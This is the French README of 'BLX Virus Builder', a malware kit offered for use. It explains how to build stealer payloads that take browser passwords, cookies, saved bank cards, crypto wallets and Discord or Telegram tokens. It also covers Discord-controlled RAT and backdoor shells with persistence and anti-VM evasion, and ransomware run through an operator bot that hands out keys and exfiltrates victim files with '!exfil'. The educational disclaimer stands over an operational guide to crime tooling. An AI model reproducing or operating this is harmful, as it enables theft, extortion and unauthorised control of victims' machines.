# BLX - Virus Builder

Outil Virus Builder de **BLX**. Tout ce dont le builder a besoin est dans ce dossier.

- **Projet :** [BLX](https://github.com/benzoXdev/BLX)
- **Auteur :** [benzoXdev](https://github.com/benzoXdev)
- **GitHub :** https://github.com/benzoXdev/BLX

---

## ⚠️ Avertissement / Disclaimer

**Cet outil est fourni à des fins éducatives et de recherche en cybersécurité uniquement.**  
L’auteur et les contributeurs **ne sont en aucun cas responsables** de l’usage illégal ou malveillant qui pourrait en être fait. L’utilisation de ce logiciel pour attaquer des systèmes sans autorisation explicite est **interdite** et peut être punie par la loi. En utilisant cet outil, vous acceptez d’en faire un **usage légal et éthique**. Tout usage illégal vous engage seul.

---

## Sommaire

1. [Structure du projet](#1-structure-du-projet)
2. [Installation et lancement](#2-installation-et-lancement)
3. [Utilisation du builder](#3-utilisation-du-builder)
4. [Options Stealer](#4-options-stealer)
5. [Options Malware](#5-options-malware)
6. [Config RAT et Backdoor](#6-config-rat-et-backdoor)
7. [Option Ransomware](#7-option-ransomware)
8. [Config Ransomware dans le builder](#8-config-ransomware-dans-le-builder)
9. [Déchiffreur (BLX_Decryptor)](#9-déchiffreur-blx_decryptor)
10. [Bot Discord (BLX_Ransomware_Bot)](#10-bot-discord-blx_ransomware_bot)
11. [Configuration du bot](#11-configuration-du-bot)
12. [Build du déchiffreur en EXE](#12-build-du-déchiffreur-en-exe)
13. [Sortie des builds](#13-sortie-des-builds)
14. [Dépendances](#14-dépendances)

---

## 1. Structure du projet

```
Virus Builder/
├── Virus-Builder.py              # Point d'entrée : lancer ce fichier
├── Config/
│   ├── __init__.py
│   ├── Config.py                 # Configuration (nom, version, etc.)
│   └── Util.py                   # Utilitaires (banner, couleurs, Reset, etc.)
├── FileDetectedByAntivirus/
│   ├── __init__.py
│   ├── BuilderOptions.py         # Briques du build : CORE, STEALER, MALWARE, DISCORD
│   └── blxOP/        # (optionnel)
├── Ransomware/
│   ├── BLX_Decryptor.py          # Déchiffreur .blx (donner à la victime avec la clé)
│   ├── BLX_Ransomware_Bot.py     # Bot Discord : !key, !keys, !exfil, !info, !decryptor
│   ├── BLX_ransomware_bot_config.example.json
│   ├── build_decryptor_exe.bat   # Compile BLX_Decryptor en EXE
│   └── README.md                 # Référence rapide Ransomware
├── Img/
│   ├── BLX_icon.ico
│   └── 7752569.ico
├── 1-Output/
│   └── VirusBuilder/              # Sortie des builds + BLX_ransomware_keys.json
├── requirements.txt
├── run.bat
├── setup.bat
└── README.md
```

---

## 2. Installation et lancement

1. **Cloner le dépôt :**
   ```bash
   git clone https://github.com/benzoXdev/BLX.git
   cd BLX
   ```

2. **Installer les dépendances :**
   ```bash
   pip install -r requirements.txt
   ```

3. **Lancer le builder** (depuis le dossier du projet) :
   ```bash
   python Virus-Builder.py
   ```
   Sous Linux : `python3 Virus-Builder.py` si besoin.

4. **Sous Windows** : vous pouvez utiliser `run.bat` ou `setup.bat` si fournis.

---

## 3. Utilisation du builder

1. **Webhook Discord** : saisir l’URL du webhook (obligatoire) et tester si besoin.
2. **Options** : cocher les modules souhaités (Stealer et/ou Malware), voir [Options Stealer](#4-options-stealer) et [Options Malware](#5-options-malware).
3. **Configs optionnelles** : pour RAT, Backdoor ou Ransomware, cocher l’option puis valider la fenêtre de config qui s’ouvre.
4. **Build** :
   - **Nom du fichier** : nom du futur .py ou .exe.
   - **Type** : **Python File** (.py) ou **Exe File** (.exe).
   - **Icône** : choisir un .ico (surtout pour Exe File).
5. Cliquer sur **Build** ; les fichiers sont créés dans `1-Output/VirusBuilder/`.

---

## 4. Options Stealer

| Option | Description |
|--------|-------------|
| System Info | Informations système (OS, CPU, RAM, etc.) |
| Wallets Session Files | Fichiers de session des portefeuilles crypto |
| Games Session Files | Fichiers de session des launchers de jeux |
| Telegram Session Files | Fichiers de session Telegram |
| Roblox Accounts | Comptes Roblox |
| Discord Accounts | Comptes Discord (tokens, etc.) |
| Discord Injection | Injection dans le client Discord |
| Passwords | Mots de passe navigateurs |
| Cookies | Cookies navigateurs |
| Browsing History | Historique de navigation |
| Download History | Historique des téléchargements |
| Cards | Cartes bancaires enregistrées |
| Extentions | Extensions de navigateurs |
| Interesting Files | Fichiers jugés intéressants |
| Webcam | Capture webcam |
| Screenshot | Capture d’écran |

---

## 5. Options Malware

| Option | Description |
|--------|-------------|
| Block Key | Bloquer le clavier |
| Block Mouse | Bloquer la souris |
| Block Task Manager | Bloquer le Gestionnaire des tâches |
| Block AV Website | Bloquer l’accès à des sites d’antivirus |
| Shutdown | Éteindre la machine |
| Message Popup | Afficher une fenêtre (titre, message, type : info/warning/error/question) |
| Spam Open Program | Ouvrir en boucle des programmes |
| Spam Create File | Créer des fichiers en boucle |
| Anti VM & Debug | Détection VM / debug (ne pas exécuter dans certains environnements) |
| Launch at Startup | Lancer au démarrage Windows |
| Restart Every 5min | Redémarrer le payload toutes les 5 minutes |
| RAT | RAT Discord (commande à distance) — config : token, server ID, persistance, admin requis |
| Backdoor (Shell) | Backdoor / shell Discord — config : token, server ID, persistance, admin requis |
| Ransomware | Chiffrement .blx + déchiffreur + bot opérateur — voir [Option Ransomware](#7-option-ransomware) |

---

## 6. Config RAT et Backdoor

- **RAT** : cocher « RAT » puis ouvrir la config (en cliquant sur la case). Renseigner **Bot Token**, **Server ID**, optionnellement **Persistence** et **Admin required**.
- **Backdoor** : cocher « Backdoor (Shell) » puis ouvrir la config. Renseigner **Bot Token**, **Server ID**, **Persistence**, **Admin required**.

---

## 7. Option Ransomware

Si l’option **Ransomware** est activée au build :

- **Clés** : enregistrées dans `1-Output/VirusBuilder/BLX_ransomware_keys.json` et copiées dans `Ransomware/BLX_ransomware_keys.json`.
- **Déchiffreur** : le builder compile automatiquement **BLX_Decryptor.exe** et l’intègre au payload (déposé sur le Bureau de la victime). Compilation manuelle possible : [Build du déchiffreur en EXE](#12-build-du-déchiffreur-en-exe).
- **Bot opérateur** : lancer `python Ransomware\BLX_Ransomware_Bot.py` (depuis la racine du projet). Le bot lit les clés dans `Ransomware\BLX_ransomware_keys.json` ou `1-Output\VirusBuilder\BLX_ransomware_keys.json`.
- **Config du bot** : copier `Ransomware\BLX_ransomware_bot_config.example.json` en `Ransomware\BLX_ransomware_bot_config.json` et renseigner au minimum **token** et **server_id**. Détails : [Configuration du bot](#11-configuration-du-bot).

---

## 8. Config Ransomware dans le builder

En cochant **Ransomware** et en ouvrant la fenêtre de config (clic sur la case), vous pouvez définir :

| Champ | Description |
|-------|-------------|
| **Ouvrir dossier Ransomware** | Bouton : ouvre le dossier `Ransomware` du projet. |
| **Bot Token** | Token du bot Discord (pour les commandes !key, etc.). |
| **Server ID** | ID du serveur Discord. |
| **Webhook URL** | Webhook pour les rapports victimes (peut être le même que le webhook principal). |
| **Exfil Bot Token** | Token du second bot (écoute victime pour !exfil). Optionnel. |
| **Exfil Channel ID** | ID du canal où le bot envoie les commandes !exfil (le payload écoute ce canal). Optionnel. |
| **Extensions exclues** | Extensions non chiffrées, séparées par des virgules. Ex. : `.exe,.dll,.sys` (vide = aucune exclusion par extension). |
| **Chemins exclus** | Chemins sous lesquels les fichiers ne sont pas chiffrés, séparés par des virgules. Ex. : `C:\Users\Public` (vide = aucun). |
| **Texte README** | Message personnalisé écrit dans `README_BLX.txt` sur le Bureau de la victime (vide = message par défaut). |
| **Délai avant chiffrement** | Délai en secondes avant de lancer le chiffrement (0 = immédiat, max 86400). |

---

## 9. Déchiffreur (BLX_Decryptor)

**Fichier :** `Ransomware/BLX_Decryptor.py`  
À donner à la victime avec la **clé de déchiffrement** (base64, 32 octets) fournie par le bot : `!key <victim_id>`.

### Interface graphique (par défaut)

1. Coller la **clé** (base64) reçue.
2. Choisir le **dossier** à déchiffrer (par défaut : dossier utilisateur).
3. **Count .blx** : compte les fichiers `.blx` dans le dossier (calcul en arrière-plan).
4. **Decrypt .blx files** : lance le déchiffrement.
5. **Progress** : barre de progression et fichier en cours.
6. **Stop** : interrompt le déchiffrement.
7. À la fin : **rapport** (Bureau ou dossier cible), **clé mémorisée** (AppData ou à côté du script), **nettoyage** (persistance, README_BLX.txt) et **auto-suppression** du déchiffreur en cas de succès.

Fonctionnalités : progression, Stop, comptage .blx, mémorisation de la clé, rapport détaillé (succès/échecs).

### Ligne de commande (CLI)

```bash
python Ransomware/BLX_Decryptor.py --cli
```

Saisir la clé (base64) et le dossier à déchiffrer (Entrée = dossier utilisateur par défaut).

---

## 10. Bot Discord (BLX_Ransomware_Bot)

**Fichier :** `Ransomware/BLX_Ransomware_Bot.py`

### Lancement

Depuis la **racine du projet** (Virus Builder) :

```bash
python Ransomware\BLX_Ransomware_Bot.py
```

Le bot lit la config dans `Ransomware\BLX_ransomware_bot_config.json` et les clés dans `Ransomware\BLX_ransomware_keys.json` ou `1-Output\VirusBuilder\BLX_ransomware_keys.json`.

### Commandes

| Commande | Description |
|----------|-------------|
| `!key <victim_id>` | Envoie la clé de déchiffrement en **MP** à l’auteur de la commande. |
| `!key <victim_id> <channel_id>` | Envoie la clé dans le **canal** indiqué (au lieu des MP). |
| `!keys` | Liste les Victim ID présents dans le fichier de clés. |
| `!exfil <victim_id> <chemin_fichier>` | Envoie une commande d’exfiltration au payload de la victime (si exfil configuré). Ex. : `!exfil ABC123 C:\Users\victim\Desktop\fichier.txt` (max 8 Mo, sous `C:\Users`). |
| `!info` | Affiche l’état du bot (fichier de clés, nombre de victimes, exfil, rôles). |
| `!info <victim_id>` | Indique si une clé existe pour ce Victim ID. |
| `!decryptor` | Rappel des instructions pour la victime (utilisation de BLX_Decryptor.exe). |
| `!help` | Affiche l’aide des commandes. |

### Restriction par rôles

Si **allowed_role_ids** est renseigné dans la config, seuls les utilisateurs ayant **au moins un** de ces rôles peuvent utiliser les commandes. Sinon, tout le monde peut les utiliser.

### Log des commandes

Si **log_file** est renseigné dans la config, chaque commande est enregistrée dans ce fichier (date, commande, auteur, canal).

---

## 11. Configuration du bot

1. Copier **`Ransomware/BLX_ransomware_bot_config.example.json`** en **`Ransomware/BLX_ransomware_bot_config.json`**.
2. Renseigner au minimum :
   - **token** : token du bot Discord.
   - **server_id** : ID du serveur Discord.
3. Optionnel :
   - **exfil_channel_id** : ID du canal où le bot envoie les commandes `!exfil` (le payload de la victime écoute ce canal).
   - **allowed_role_ids** : liste d’IDs de rôles autorisés à utiliser les commandes (vide = tous).
   - **log_file** : chemin d’un fichier pour logger les commandes (vide = pas de log fichier).

Exemple complet :

```json
{
  "token": "VOTRE_TOKEN_BOT",
  "server_id": "ID_DU_SERVEUR",
  "exfil_channel_id": "ID_CANAL_EXFIL",
  "allowed_role_ids": ["ID_ROLE_1", "ID_ROLE_2"],
  "log_file": "Ransomware/command_log.txt"
}
```

---

## 12. Build du déchiffreur en EXE

Pour compiler **BLX_Decryptor.py** en **BLX_Decryptor.exe** (un seul fichier, sans console) :

1. Ouvrir un terminal dans le dossier **Ransomware** :
   ```bash
   cd Ransomware
   ```
2. Lancer :
   ```bash
   build_decryptor_exe.bat
   ```
   ou manuellement :
   ```bash
   python -m PyInstaller --onefile --windowed --name BLX_Decryptor --icon "..\Img\7752569.ico" --clean BLX_Decryptor.py
   ```
3. L’exécutable se trouve dans **`Ransomware\dist\BLX_Decryptor.exe`**.

Le Virus Builder peut aussi compiler et intégrer automatiquement ce déchiffreur au payload lors d’un build avec l’option Ransomware activée (dépôt sur le Bureau de la victime).

---

## 13. Sortie des builds

- **Fichiers générés (.py ou .exe)** : **`1-Output/VirusBuilder/`**
- **Clés Ransomware** (si option activée) :
  - **`1-Output/VirusBuilder/BLX_ransomware_keys.json`**
  - Copie dans **`Ransomware/BLX_ransomware_keys.json`** pour le bot.

---

## 14. Dépendances

Voir **`requirements.txt`**. Principales :

- **Builder (GUI)** : colorama, cryptography, customtkinter, requests, discord.py, pyinstaller
- **Stealer / navigateurs** : browser-cookie3, pycryptodome
- **Système / hardware** : psutil, GPUtil, screeninfo
- **Webcam / capture** : opencv-python, Pillow, mss
- **Clavier / souris** : keyboard, pyautogui, pynput
- **Audio** : sounddevice, scipy
- **RAT / divers** : comtypes, pycaw, numpy
- **Windows** : pywin32
- **Optionnels** : auto-py-to-exe, bcrypt, beautifulsoup4, selenium, etc.

Installation globale : `pip install -r requirements.txt`
